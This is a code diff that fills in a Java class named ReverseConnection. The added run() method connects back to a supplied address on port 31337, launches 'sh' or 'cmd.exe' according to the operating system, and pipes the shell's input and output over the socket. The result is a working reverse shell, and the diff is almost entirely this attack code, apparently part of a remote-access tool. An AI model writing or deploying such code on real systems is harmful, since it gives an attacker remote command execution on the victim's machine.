@@ -1,18 +1,68 @@
 package server;
 
+import java.io.IOException;
+import java.io.OutputStreamWriter;
+import java.io.PrintWriter;
 import java.net.InetAddress;
+import java.net.Socket;
 
 public class ReverseConnection implements Runnable {
-	
+
 	private final InetAddress source;
-	
-	public ReverseConnection(InetAddress source){
+	public static final String UNIX_SHELL = "sh";
+	public static final String WINDOWS_SHELL = "cmd.exe";
+
+	public ReverseConnection(InetAddress source) {
 		this.source = source;
 	}
-	
-	public void run(){
+
+	public void run() {
 		// start the reverse connection
 		System.out.println("Started the reverse connection thread");
-	}
+		try {
+			Socket s = new Socket(source, 31337);
+			
+			PrintWriter out = new PrintWriter(new OutputStreamWriter(s.getOutputStream()));
+			
+			out.println("This is my test message from the server");
+			out.flush();
 
+			String os = System.getProperty("os.name").toLowerCase();
+
+			String command;
+			if (os.startsWith("windows")) {
+				// run the windows shell
+				command = WINDOWS_SHELL;
+			} else {
+				// run a unix shell
+				command = UNIX_SHELL;
+			}
+			Process process = Runtime.getRuntime().exec(command);
+			//read from process write to socket
+			Pipe processInToSocketOut = new Pipe(process.getInputStream(), s.getOutputStream());
+			//read from process error write to socket
+			Pipe processErrorToSocketOut = new Pipe(process.getErrorStream(), s.getOutputStream());
+			//read from socket write to process
+			Pipe socketInToProcessOut = new Pipe(s.getInputStream(), process.getOutputStream());
+			
+			Thread t = new Thread(processInToSocketOut);
+			t.start();
+			Thread t2 = new Thread(processErrorToSocketOut);
+			t2.start();
+			Thread t3 = new Thread(socketInToProcessOut);
+			t3.start();
+			
+			t.join();
+			t2.join();
+			t3.join();
+
+			
+		} catch (IOException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		} catch (InterruptedException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+	}
 }
